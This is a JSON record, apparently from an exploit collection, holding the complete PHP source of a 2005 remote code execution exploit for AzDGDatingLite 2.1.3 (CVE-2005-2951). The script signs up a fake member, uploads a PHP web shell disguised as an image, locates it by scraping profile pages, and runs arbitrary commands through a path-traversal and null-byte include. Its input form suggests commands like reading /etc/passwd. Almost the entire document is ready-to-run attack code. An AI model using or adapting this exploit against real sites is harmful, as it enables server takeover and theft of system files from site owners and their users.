{
  "id": "1214",
  "title": "AzDGDatingLite 2.1.3 - Remote Code Execution",
  "cve": "CVE-2005-2951",
  "vuln_type": "rce",
  "code": "<?php\r\n#   azdgexpl.php                                                               #\r\n#                                                                              #\r\n#   AzDGDatingLite V 2.1.3 ( possibly prior versions) remote code execution    #\r\n#   with generic http proxy support                                            #\r\n#                                                                              #\r\n#                                by rgod                                       #\r\n#                      site: http://rgod.altervista.org                        #\r\n#                                                                              #\r\n#   make these changes in php.ini if you have troubles                         #\r\n#   to launch this script:                                                     #\r\n#   allow_call_time_pass_reference = on                                        #\r\n#   register_globals = on                                                      #\r\n#                                                                              #\r\n#   usage: launch this script from Apache, fill requested fields, then         #\r\n#   go!                                                                        #\r\n#                                                                              #\r\n#   Sun-tzu: \"Therefore, I say: Know your enemy and know yourself; in a        #\r\n#   hundred battles, you will never be defeated. When you are ignorant         #\r\n#   of the enemy but know yourself, your chances of winning or losing          #\r\n#   are equal. If ignorant both of your enemy and of yourself, you are         #\r\n#   sure to be defeated in every battle.\"                                      #\r\n#                                                                              #\r\n\r\n\r\nerror_reporting(0);\r\nini_set(\"max_execution_time\",0);\r\nini_set(\"default_socket_timeout\", 2);\r\nob_implicit_flush (1);\r\n\r\necho'<head><title>AzDGDatingLite V 2.1.3  remote commands execution</title><meta\r\nhttp-equiv=\"Content-Type\"  content=\"text/html; charset=iso-8859-1\"> <style type=\r\n\"text/css\"> <!-- body,td,th {color:  #00FF00;} body {background-color: #000000;}\r\n.Stile5 {font-family: Verdana, Arial, Helvetica,  sans-serif; font-size: 10px; }\r\n.Stile6 {font-family: Verdana, Arial, Helvetica, sans-serif; font-weight:  bold;\r\nfont-style: italic; } --> </style></head> <body> <p class=\"Stile6\"> AzDGDatingLi\r\nte V 2.1.3 (possibly prior versions) remote commands execution</p><p class=\"Stil\r\ne6\">a script by rgod at <a href=\"http://rgod.altervista.org\"    target=\"_blank\">\r\nhttp://rgod.altervista.org</a></p><table width=\"84%\"><tr><td width=\"43%\"> <form\r\nname=\"form1\"      method=\"post\"   action=\"'.$SERVER[PHP_SELF].'?path=value&host=\r\nvalue&port=value&command=value&proxy=value&uploaddir=value\"> <p>    <input type=\r\n\"text\" name=\"host\"><span class=\"Stile5\">hostname (ex: www.sitename.com)  </span>\r\n</p><p><input type=\"text\" name=\"path\"><span class=\"Stile5\">  path (ex: /azdg/ or\r\njust /) </span></p><p><input type=\"text\"   name=\"port\" >   <span class=\"Stile5\">\r\nspecify a port other than 80 (default value)  </span></p><p> <input  type=\"text\"\r\nname=\"command\"> <span  class=\"Stile5\"> a Unix command , example: ls -la  to list\r\ndirectories, cat /etc/passwd to show passwd file </span></p><p><input type=\"text\r\n\" name=\"proxy\"> <span class=\"Stile5\"> send exploit through an HTTP proxy (ip:por\r\nt</span></p> <p> <input  type=\"submit\"name=\"Submit\" value=\"go!\"></p></form></td>\r\n</tr></table></body></html>';\r\n\r\nfunction make_seed()\r\n{\r\n   list($usec, $sec) = explode(' ', microtime());\r\n   return (float) $sec + ((float) $usec * 100000);\r\n}\r\n\r\nfunction show($headeri)\r\n{\r\n$ii=0;\r\n$ji=0;\r\n$ki=0;\r\n$ci=0;\r\necho '<table border=\"0\"><tr>';\r\nwhile ($ii <= strlen($headeri)-1)\r\n{\r\n$datai=dechex(ord($headeri[$ii]));\r\nif ($ji==16) {\r\n             $ji=0;\r\n             $ci++;\r\n             echo \"<td>&nbsp;&nbsp;</td>\";\r\n             for ($li=0; $li<=15; $li++)\r\n                      { echo \"<td>\".$headeri[$li+$ki].\"</td>\";\r\n\t\t\t    }\r\n            $ki=$ki+16;\r\n            echo \"</tr><tr>\";\r\n            }\r\nif (strlen($datai)==1) {echo \"<td>0\".$datai.\"</td>\";} else\r\n{echo \"<td>\".$datai.\"</td> \";}\r\n$ii++;\r\n$ji++;\r\n}\r\nfor ($li=1; $li<=(16 - (strlen($headeri) % 16)+1); $li++)\r\n                      { echo \"<td>&nbsp&nbsp</td>\";\r\n                       }\r\n\r\nfor ($li=$ci*16; $li<=strlen($headeri); $li++)\r\n                      { echo \"<td>\".$headeri[$li].\"</td>\";\r\n\t\t\t    }\r\necho \"</tr></table>\";\r\n}\r\n\r\n$proxy_regex = '(\\b\\d{1,3}\\.\\d{1,3}\\.\\d{1,3}\\.\\d{1,3}\\:\\d{1,5}\\b)';\r\n\r\nfunction sendpacket($packet)\r\n{\r\nglobal $proxy, $host, $port, $html;\r\nif ($proxy=='')\r\n           {$ock=fsockopen(gethostbyname($host),$port);}\r\n             else\r\n           {\r\n\t    if (!eregi($proxy_regex,$proxy))\r\n\t    {echo htmlentities($proxy).' -> not a valid proxy...';\r\n\t     die;\r\n\t    }\r\n\t   $parts=explode(':',$proxy);\r\n\t    echo 'Connecting to '.$parts[0].':'.$parts[1].' proxy...<br>';\r\n\t    $ock=fsockopen($parts[0],$parts[1]);\r\n\t    if (!$ock) { echo 'No response from proxy...';\r\n\t\t\tdie;\r\n\t\t       }\r\n\t   }\r\nfputs($ock,$packet);\r\nif ($proxy=='')\r\n  {\r\n\r\n    $html='';\r\n    while (!feof($ock))\r\n      {\r\n        $html.=fgets($ock);\r\n      }\r\n  }\r\nelse\r\n  {\r\n    $html='';\r\n    while ((!feof($ock)) or (!eregi(chr(0x0d).chr(0x0a).chr(0x0d).chr(0x0a),$html)))\r\n    {\r\n      $html.=fread($ock,1);\r\n    }\r\n  }\r\nfclose($ock);\r\necho nl2br(htmlentities($html));\r\n}\r\n\r\nif (($path<>'') and ($host<>'') and ($command<>''))\r\n{\r\n  if ($port=='') {$port=80;}\r\n\r\n# step 1 -> register and upload the evil jpeg file\r\n\r\nsrand(make_seed());\r\n$anumber=rand(10000,99999);\r\n\r\n//do not modify absolutely CRLF and spaces here...\r\n$data='-----------------------------23281168279961\r\nContent-Disposition: form-data; name=\"l\"\r\n\r\ndefault\r\n-----------------------------23281168279961\r\nContent-Disposition: form-data; name=\"a\"\r\n\r\na\r\n-----------------------------23281168279961\r\nContent-Disposition: form-data; name=\"fname\"\r\n\r\njimihendrix'.$anumber.'\r\n-----------------------------23281168279961\r\nContent-Disposition: form-data; name=\"lname\"\r\n\r\njimihendrix'.$anumber.'\r\n-----------------------------23281168279961\r\nContent-Disposition: form-data; name=\"pass\"\r\n\r\njimihendrix'.$anumber.'\r\n-----------------------------23281168279961\r\nContent-Disposition: form-data; name=\"rpass\"\r\n\r\njimihendrix'.$anumber.'\r\n-----------------------------23281168279961\r\nContent-Disposition: form-data; name=\"month\"\r\n\r\n11\r\n-----------------------------23281168279961\r\nContent-Disposition: form-data; name=\"day\"\r\n\r\n27\r\n-----------------------------23281168279961\r\nContent-Disposition: form-data; name=\"year\"\r\n\r\n1942\r\n-----------------------------23281168279961\r\nContent-Disposition: form-data; name=\"gender\"\r\n\r\n1\r\n-----------------------------23281168279961\r\nContent-Disposition: form-data; name=\"purpose\"\r\n\r\n1\r\n-----------------------------23281168279961\r\nContent-Disposition: form-data; name=\"country\"\r\n\r\n158\r\n-----------------------------23281168279961\r\nContent-Disposition: form-data; name=\"email\"\r\n\r\njimihendrix'.$anumber.'@hotmail.com\r\n-----------------------------23281168279961\r\nContent-Disposition: form-data; name=\"url\"\r\n\r\n\r\n-----------------------------23281168279961\r\nContent-Disposition: form-data; name=\"icq\"\r\n\r\n\r\n-----------------------------23281168279961\r\nContent-Disposition: form-data; name=\"aim\"\r\n\r\n\r\n-----------------------------23281168279961\r\nContent-Disposition: form-data; name=\"phone\"\r\n\r\n\r\n-----------------------------23281168279961\r\nContent-Disposition: form-data; name=\"city\"\r\n\r\n\r\n-----------------------------23281168279961\r\nContent-Disposition: form-data; name=\"marstat\"\r\n\r\n0\r\n-----------------------------23281168279961\r\nContent-Disposition: form-data; name=\"child\"\r\n\r\n0\r\n-----------------------------23281168279961\r\nContent-Disposition: form-data; name=\"height\"\r\n\r\n0\r\n-----------------------------23281168279961\r\nContent-Disposition: form-data; name=\"weight\"\r\n\r\n0\r\n-----------------------------23281168279961\r\nContent-Disposition: form-data; name=\"hcolor\"\r\n\r\n0\r\n-----------------------------23281168279961\r\nContent-Disposition: form-data; name=\"ecolor\"\r\n\r\n0\r\n-----------------------------23281168279961\r\nContent-Disposition: form-data; name=\"etnicity\"\r\n\r\n0\r\n-----------------------------23281168279961\r\nContent-Disposition: form-data; name=\"religion\"\r\n\r\n0\r\n-----------------------------23281168279961\r\nContent-Disposition: form-data; name=\"smoke\"\r\n\r\n0\r\n-----------------------------23281168279961\r\nContent-Disposition: form-data; name=\"drink\"\r\n\r\n0\r\n-----------------------------23281168279961\r\nContent-Disposition: form-data; name=\"education\"\r\n\r\n0\r\n-----------------------------23281168279961\r\nContent-Disposition: form-data; name=\"job\"\r\n\r\n\r\n-----------------------------23281168279961\r\nContent-Disposition: form-data; name=\"hobby\"\r\n\r\n\r\n-----------------------------23281168279961\r\nContent-Disposition: form-data; name=\"descr\"\r\n\r\nrock star\r\n-----------------------------23281168279961\r\nContent-Disposition: form-data; name=\"sgender\"\r\n\r\n0\r\n-----------------------------23281168279961\r\nContent-Disposition: form-data; name=\"setnicity\"\r\n\r\n0\r\n-----------------------------23281168279961\r\nContent-Disposition: form-data; name=\"sreligion\"\r\n\r\n0\r\n-----------------------------23281168279961\r\nContent-Disposition: form-data; name=\"agef\"\r\n\r\n14\r\n-----------------------------23281168279961\r\nContent-Disposition: form-data; name=\"aget\"\r\n\r\n60\r\n-----------------------------23281168279961\r\nContent-Disposition: form-data; name=\"heightf\"\r\n\r\n1\r\n-----------------------------23281168279961\r\nContent-Disposition: form-data; name=\"heightt\"\r\n\r\n22\r\n-----------------------------23281168279961\r\nContent-Disposition: form-data; name=\"weightf\"\r\n\r\n1\r\n-----------------------------23281168279961\r\nContent-Disposition: form-data; name=\"weightt\"\r\n\r\n45\r\n-----------------------------23281168279961\r\nContent-Disposition: form-data; name=\"hdyfu\"\r\n\r\n0\r\n-----------------------------23281168279961\r\nContent-Disposition: form-data; name=\"file0\"; filename=\"jimihendrix.gif\"\r\nContent-Type: image/jpeg\r\n\r\n';\r\n\r\n$shell='<?php error_reporting(0); system($HTTP_GET_VARS[cmd].'.\"'\".' > README'.\"'\".'); ?>';\r\n\r\n$data.=$shell;\r\n\r\n$data.='\r\n-----------------------------23281168279961\r\nContent-Disposition: form-data; name=\"file1\"; filename=\"\"\r\nContent-Type: application/octet-stream\r\n\r\n\r\n-----------------------------23281168279961\r\nContent-Disposition: form-data; name=\"file2\"; filename=\"\"\r\nContent-Type: application/octet-stream\r\n\r\n\r\n-----------------------------23281168279961--';\r\nif ($proxy=='')\r\n{$packet=\"POST \".$path.\"/add.php HTTP/1.1\\r\\n\";}\r\nelse\r\n{$packet=\"POST http://\".$host.$path.\"add.php HTTP/1.1\\r\\n\";}\r\n$packet.=\"Host: \".$host.\"\\r\\n\";\r\n$packet.=\"User-Agent: Googlebot/2.1 (+http://www.google.com/bot.html)\\r\\n\";\r\n$packet.=\"Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5\\r\\n\";\r\n$packet.=\"Accept-Language: en-us,en;q=0.5\\r\\n\";\r\n$packet.=\"Accept-Encoding: gzip,deflate\\r\\n\";\r\n$packet.=\"Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7\\r\\n\";\r\n$packet.=\"Connection: close\\r\\n\";\r\n$packet.=\"Referer: http://\".$host.$path.\"add.php?l=default\\r\\n\";\r\n$packet.=\"Cookie: PHPSESSID=13798fab78f7fa6e5bb501ac83329bdd\\r\\n\";\r\n$packet.=\"Content-Type: multipart/form-data; boundary=---------------------------23281168279961\\r\\n\";\r\n$packet.=\"Content-Length: \".strlen($data).\"\\r\\n\\r\\n\";\r\n$packet.=$data;\r\nshow($packet);\r\nsendpacket($packet);\r\n\r\n#step 2 -> retrieve upload subdir name and filename from index e profile page\r\nif ($proxy=='')\r\n{$packet=\"GET \".$path.\" HTTP/1.0 \\r\\n\";}\r\nelse\r\n{$packet=\"GET http://\".$host.$path.\" HTTP/1.0 \\r\\n\";}\r\n$packet.=\"Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5\\r\\n\";\r\n$packet.=\"Accept-Encoding: text/plain\\r\\n\";\r\n$packet.=\"Host: \".$host.\"\\r\\n\\r\\n\";\r\n$packet.=\"Connection: Close\\r\\n\\r\\n\";\r\nshow($packet);\r\nsendpacket($packet);\r\n\r\n$temp='';$i=0;\r\nwhile (!eregi('jimihendrix'.$anumber,$temp))\r\n{\r\n$temp.=$html[$i];\r\n$i=$i+1;\r\nif (eregi('</html>',$temp)) { die(\" Exploit failed... \");}\r\n}\r\n\r\n$temp2=explode('<a href=\"',$temp);\r\n$temp3=count($temp2)-1;\r\n$temp=$temp2[$temp3];\r\n$temp2=explode('\"',$temp);\r\n$profile=$temp2[0];\r\n\r\necho '<br>retrieving shell path from /'.$profile.'<br><br>';\r\n\r\nif ($proxy=='')\r\n{$packet=\"GET \".$path.$profile.\" HTTP/1.0 \\r\\n\";}\r\nelse\r\n{$packet=\"GET http://\".$host.$path.$profile.\" HTTP/1.0 \\r\\n\";}\r\n$packet.=\"Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5\\r\\n\";\r\n$packet.=\"Accept-Encoding: text/plain\\r\\n\";\r\n$packet.=\"Host: \".$host.\"\\r\\n\\r\\n\";\r\n$packet.=\"Connection: Close\\r\\n\\r\\n\";\r\nshow($packet);\r\nsendpacket($packet);\r\n\r\n$temp='';$i=0;\r\nwhile (!eregi('jimihendrix'.$anumber,$temp))\r\n{\r\n$temp.=$html[$i];\r\n$i=$i+1;\r\nif (eregi('</html>',$temp)) { die(\" Exploit failed... \");}\r\n}\r\n\r\n$temp2=explode('<a href=\"',$temp);\r\n$temp3=count($temp2)-1;\r\n$temp=$temp2[$temp3];\r\n$temp2=explode('\"',$temp);\r\n$shellfullpath=$temp2[0];\r\n\r\necho '<br>Ok,found... shell is at '.$shellfullpath.'<br><br>';\r\n$temp=explode(\"/\",$shellfullpath);\r\n$temp2=count($temp)-1;\r\n$subdir=$temp[$temp2-1];\r\n$filename=$temp[$temp2];\r\n\r\n# step 3 -> launch commands\r\nif ($proxy=='')\r\n{$packet=\"GET \".$path.\"include/security.inc.php?cmd=\".urlencode($command).\"&l=\".urlencode(\"../../../members/uploads/\".$subdir.\"/\".$filename.chr(0x00)).\" HTTP/1.0 \\r\\n\";}\r\nelse\r\n{$packet=\"GET http://\".$host.$path.\"include/security.inc.php?cmd=\".urlencode($command).\"&l=\".urlencode(\"../../../members/uploads/\".$subdir.\"/\".$filename.chr(0x00)).\" HTTP/1.0 \\r\\n\";}\r\n$packet.=\"Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5\\r\\n\";\r\n$packet.=\"Accept-Encoding: text/plain\\r\\n\";\r\n$packet.=\"Host: \".$host.\"\\r\\n\\r\\n\";\r\n$packet.=\"Connection: Close\\r\\n\\r\\n\";\r\nshow($packet);\r\nsendpacket($packet);\r\n\r\n# step 4 -> making a GET request for redirected output\r\necho '<br> if AzDGDatingLite is unpatched and vulnerable now you will see '.htmlentities($command).'output...<br><br>';\r\n\r\nif ($proxy=='')\r\n{$packet=\"GET \".$path.\"include/README HTTP/1.0 \\r\\n\";}\r\nelse\r\n{$packet=\"GET http://\".$host.$path.\"include/README HTTP/1.0 \\r\\n\";}\r\n$packet.=\"Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5\\r\\n\";\r\n$packet.=\"Accept-Encoding: text/plain\\r\\n\";\r\n$packet.=\"Host: \".$host.\"\\r\\n\\r\\n\";\r\n$packet.=\"Connection: Close\\r\\n\\r\\n\";\r\nshow($packet);\r\nsendpacket($packet);\r\n}\r\n?>\r\n\r\n# milw0rm.com [2005-09-13]",
  "url": "https://www.exploit-db.com/exploits/1214"
}